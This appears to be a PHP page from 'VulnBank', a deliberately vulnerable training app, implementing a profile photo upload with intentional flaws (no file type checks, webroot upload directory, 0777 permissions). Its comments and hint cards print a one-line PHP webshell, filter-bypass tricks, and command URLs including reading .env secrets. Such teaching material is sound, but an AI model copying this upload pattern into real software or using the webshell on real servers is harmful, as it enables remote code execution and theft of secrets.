<?php
// ============================================================
//  VulnBank – Profile Photo Upload
//  INTENTIONAL VULNERABILITIES:
//    A03 – Unrestricted file upload: .php files accepted and executable
//    A05 – Upload directory inside webroot, no .htaccess
//    A04 – No size, type, or extension validation
// ============================================================
require_once 'db.php';
require '_header.php';
if (!isset($_SESSION['user_id'])) { header('Location: index.php'); exit; }

$upload_dir = __DIR__ . '/uploads/';
if (!is_dir($upload_dir)) mkdir($upload_dir, 0777, true);

$error = $success = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['photo'])) {
    $file = $_FILES['photo'];

    if ($file['error'] !== UPLOAD_ERR_OK) {
        $error = 'Upload error: ' . $file['error'];
    } else {
        // A03: UNRESTRICTED FILE UPLOAD
        // Only checks that a file was uploaded – no extension or MIME check.
        // Upload a PHP webshell: shell.php containing <?php system($_GET['cmd']); ?>
        // Then access: /uploads/shell.php?cmd=id
        //
        // "Validation" that is easily bypassed:
        //   - MIME check only reads $_FILES[type] which is user-controlled
        //   - Double extension: shell.php.jpg
        //   - Null byte: shell.php%00.jpg (older PHP versions)

        $original_name = $file['name'];
        // A03: original filename used as-is (no sanitisation)
        $dest = $upload_dir . basename($original_name);

        if (move_uploaded_file($file['tmp_name'], $dest)) {
            $url = 'uploads/' . basename($original_name);
            $success = "Uploaded to: <a href='$url' target='_blank'>$url</a>";
            // A09: upload event not logged
        } else {
            $error = 'Move failed.';
        }
    }
}

// List existing uploads
$uploads = glob($upload_dir . '*') ?: [];
?>

<div class="row justify-content-center">
  <div class="col-md-7">
    <div class="alert-vuln">
      ⚠️ <span class="badge-vuln">A03 Unrestricted File Upload</span> — <code>.php</code> files are accepted and executed by the server
    </div>

    <div class="card shadow mb-3">
      <div class="card-header">Upload Profile Photo</div>
      <div class="card-body">
        <?php if ($error):   ?><div class="alert alert-danger"><?= $error ?></div><?php endif; ?>
        <?php if ($success): ?><div class="alert alert-success"><?= $success ?></div><?php endif; ?>

        <form method="POST" enctype="multipart/form-data">
          <div class="form-group mb-3">
            <label>Photo file
              <span class="vuln-label">[A03: upload shell.php → execute at /uploads/shell.php?cmd=id]</span>
            </label>
            <input type="file" name="photo" class="form-control" accept="*/*">
            <small class="text-muted">
              Create <code>shell.php</code> containing:
              <code>&lt;?php system($_GET['cmd']); ?&gt;</code>
              then upload it.
            </small>
          </div>
          <button class="btn btn-primary">Upload</button>
        </form>
      </div>
    </div>

    <?php if ($uploads): ?>
    <div class="card shadow">
      <div class="card-header">Uploaded Files <span class="vuln-label">[A05: webroot-accessible]</span></div>
      <ul class="list-group list-group-flush">
        <?php foreach ($uploads as $f): ?>
        <li class="list-group-item d-flex justify-content-between">
          <a href="uploads/<?= htmlspecialchars(basename($f)) ?>" target="_blank">
            <?= htmlspecialchars(basename($f)) ?>
          </a>
          <small class="text-muted"><?= number_format(filesize($f)) ?> bytes</small>
        </li>
        <?php endforeach; ?>
      </ul>
    </div>
    <?php endif; ?>

    <div class="card mt-3 hint-card shadow-sm">
      <div class="card-body py-2 px-3" style="font-size:.8rem">
        <strong>Webshell payload:</strong><br>
        Save as <code>shell.php</code>:<br>
        <code>&lt;?php system($_GET['cmd']); ?&gt;</code><br><br>
        Upload it, then visit:<br>
        <code>http://localhost:8080/uploads/shell.php?cmd=id</code><br>
        <code>http://localhost:8080/uploads/shell.php?cmd=cat+.env</code>
      </div>
    </div>
  </div>
</div>

<?php require '_footer.php'; ?>
